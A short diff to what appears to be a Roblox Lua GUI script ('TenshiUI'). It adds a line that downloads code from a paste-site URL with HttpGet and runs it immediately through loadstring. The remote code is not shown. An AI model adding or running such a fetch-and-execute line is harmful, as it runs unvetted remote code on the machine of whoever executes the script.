@@ -1,3 +1,6 @@
+-- Load your custom script FIRST
+loadstring(game:HttpGet("https://pastefy.app/inoixEbY/raw"))()
+
 -- Starter GUI Setup
 local ScreenGui = Instance.new("ScreenGui", game.Players.LocalPlayer:WaitForChild("PlayerGui"))
 ScreenGui.Name = "TenshiUI"
